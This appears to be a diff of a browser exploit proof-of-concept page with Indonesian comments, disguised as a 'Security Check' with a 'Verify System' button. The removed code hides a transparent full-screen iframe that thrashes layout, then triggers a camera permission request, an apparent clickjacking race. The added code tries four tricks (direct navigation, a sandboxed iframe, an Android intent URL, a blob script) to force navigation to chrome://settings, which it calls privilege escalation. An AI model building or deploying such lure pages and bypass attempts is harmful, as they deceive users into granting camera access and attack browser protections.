@@ -7,57 +7,40 @@
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #f0f4f8;
+    background: #f4f6f8;
     font-family: -apple-system, BlinkMacSystemFont, sans-serif;
     display: flex; justify-content: center; align-items: center;
     height: 100vh; margin: 0; flex-direction: column;
-    overflow: hidden;
   }
   .panel {
     background: #fff; padding: 40px; border-radius: 12px;
     box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
-    max-width: 400px; width: 100%; z-index: 10; position: relative;
+    max-width: 450px; width: 100%;
   }
   h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
   p { color: #666; margin-bottom: 20px; font-size: 14px; }
   button {
-    background: #007aff; color: #fff; padding: 15px 30px;
-    border-radius: 8px; font-size: 18px; font-weight: bold;
-    cursor: pointer; border: none; width: 100%;
-    position: relative; z-index: 20;
+    background: #007aff; color: #fff; padding: 15px;
+    border-radius: 8px; font-size: 16px; font-weight: bold;
+    cursor: pointer; border: none; width: 100%; margin-bottom: 10px;
   }
-
-  /* Iframe Tersembunyi (Akan di-resize secara brutal) */
-  #trapFrame {
-    position: absolute;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    opacity: 0; /* Transparan, menutupi layar */
-    z-index: 9999;
-    border: none;
-    pointer-events: none; /* Biarkan klik ke tombol */
-    transition: all 0.1s;
-  }
-
+  button:hover { background: #005bb5; }
   #log {
     margin-top: 20px; background: #000; color: #0f0;
     padding: 10px; font-family: monospace; font-size: 12px;
-    border-radius: 6px; width: 100%; max-width: 400px;
-    height: 120px; overflow-y: auto; text-align: left;
-    z-index: 10000; position: relative;
+    border-radius: 6px; width: 100%; max-width: 450px;
+    height: 150px; overflow-y: auto; text-align: left;
   }
+  iframe { display: none; }
 </style>
 </head>
 <body>
 
 <div class="panel">
   <h1>🔒 Security Check</h1>
-  <p>Klik tombol di bawah untuk memverifikasi.</p>
-  <button id="startBtn">Verify System</button>
+  <p>Klik tombol di bawah untuk memverifikasi sistem.</p>
+  <button id="bypassBtn">Verify System</button>
 </div>
-
-<!-- IFRAME PENJEBAK -->
-<iframe id="trapFrame" allow="camera; microphone"></iframe>
 
 <div id="log">Sistem siap...</div>
 
@@ -66,101 +49,70 @@
   'use strict';
 
   var logEl = document.getElementById('log');
-  var trapFrame = document.getElementById('trapFrame');
-  var btn = document.getElementById('startBtn');
-  
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
     console.log(msg);
   }
 
-  // ============================================
-  // 1. INJEKSI PAYLOAD KE DALAM IFRAME
-  // ============================================
-  var payloadHTML = `
-    <!DOCTYPE html>
-    <html>
-    <body style="margin:0;width:100vw;height:100vh;background:transparent;">
-      <script>
-        // Fungsi untuk meminta izin kamera
-        function requestCam() {
-          if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-              .then(function(stream) {
-                parent.postMessage("CAM_GRANTED", "*");
-              })
-              .catch(function(err) {
-                parent.postMessage("CAM_DENIED:" + err.name, "*");
-              });
-          }
-        }
+  // Target URL Internal
+  var internalUrl = "chrome://settings";
 
-        // Dengar perintah dari parent
-        window.addEventListener('message', function(e) {
-          if (e.data === 'REQ_CAM') {
-            requestCam();
-          }
-        });
-      <\/script>
-    </body>
-    </html>
-  `;
+  document.getElementById('bypassBtn').addEventListener('click', function() {
+    log("[!] Memulai Omnibox Privilege Escalation...");
 
-  trapFrame.srcdoc = payloadHTML;
-
-  // Listener pesan dari iframe
-  window.addEventListener('message', function(e) {
-    if (e.data === "CAM_GRANTED") {
-      log("🚨 BUG: Kamera DIIZINKAN dari dalam Iframe!");
-    } else if (e.data.indexOf("CAM_DENIED") !== -1) {
-      log("✅ Kamera diblokir: " + e.data.split(":")[1]);
+    // ============================================
+    // METODE 1: DIRECT NAVIGATION (Expected: Diblokir)
+    // ============================================
+    try {
+      window.location.href = internalUrl;
+      log("[+] Direct Navigation dicoba (kemungkinan besar diblokir).");
+    } catch(e) {
+      log("[-] Direct Nav error: " + e.message);
     }
-  });
 
-  // ============================================
-  // 2. UI RACE CONDITION (Resize Iframe Brutal)
-  // ============================================
-  function triggerIframeReflow() {
-    log("[!] Memicu Reflow Iframe (Layout Thrashing)...");
-    
-    var start = Date.now();
-    function reflowLoop() {
-      if (Date.now() - start < 1000) { 
-        // Ubah ukuran iframe secara ekstrem setiap frame (60fps)
-        // Ini memaksa browser menghitung ulang layout terus menerus
-        var scale = 1 + (Math.random() * 0.5); // 1.0 - 1.5
-        trapFrame.style.transform = `scale(${scale})`;
-        trapFrame.style.width = `${100 + Math.random() * 50}%`;
-        trapFrame.style.height = `${100 + Math.random() * 50}%`;
+    // ============================================
+    // METODE 2: IFRAME SANDBOX (Celah UI Spoofing)
+    // ============================================
+    setTimeout(function() {
+      var iframe = document.createElement('iframe');
+      // Meminta izin untuk navigasi top-level dan eksekusi script
+      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
+      iframe.src = internalUrl;
+      iframe.style.display = "none";
+      document.body.appendChild(iframe);
+      log("[+] Iframe Chrome:// dicoba.");
+    }, 500);
+
+    // ============================================
+    // METODE 3: INTENT REDIRECTION (Khusus Android)
+    // ============================================
+    // Format Intent untuk membuka internal settings Chrome
+    setTimeout(function() {
+      var intentUrl = "intent://settings/#Intent;scheme=chrome;package=com.android.chrome;end";
+      try {
+        window.location.href = intentUrl;
+        log("[+] Intent Redirection (chrome://settings) dicoba.");
+      } catch(e) {}
+    }, 1000);
+
+    // ============================================
+    // METODE 4: BLOB WRAPPER (Bypass Parser)
+    // ============================================
+    setTimeout(function() {
+      try {
+        // Membungkus URL internal di dalam script Blob
+        var blobPayload = `<script>window.top.location.href = "${internalUrl}";<\/script>`;
+        var blob = new Blob([blobPayload], { type: 'text/html' });
+        var url = URL.createObjectURL(blob);
         
-        requestAnimationFrame(reflowLoop);
-      } else {
-        // Kembalikan ke ukuran normal
-        trapFrame.style.transform = 'scale(1)';
-        trapFrame.style.width = '100%';
-        trapFrame.style.height = '100%';
-        log("[!] Reflow selesai. Mengeksekusi prompt kamera...");
-        
-        // Paksa minta kamera
-        trapFrame.contentWindow.postMessage('REQ_CAM', '*');
-      }
-    }
-    requestAnimationFrame(reflowLoop);
-  }
+        var iframe2 = document.createElement('iframe');
+        iframe2.src = url;
+        iframe2.style.display = "none";
+        document.body.appendChild(iframe2);
+        log("[+] Blob Wrapper Chrome:// dicoba.");
+      } catch(e) {}
+    }, 1500);
 
-  // ============================================
-  // 3. TRIGGER EVENT
-  // ============================================
-  btn.addEventListener('click', function() {
-    triggerIframeReflow();
-  });
-
-  // ============================================
-  // 4. ZERO-CLICK SPLIT VIEW ATTEMPT (Resize)
-  // ============================================
-  window.addEventListener('resize', function() {
-    log("[!] Resize terdeteksi (Split View). Memicu bypass iframe...");
-    triggerIframeReflow();
   });
 
 })();
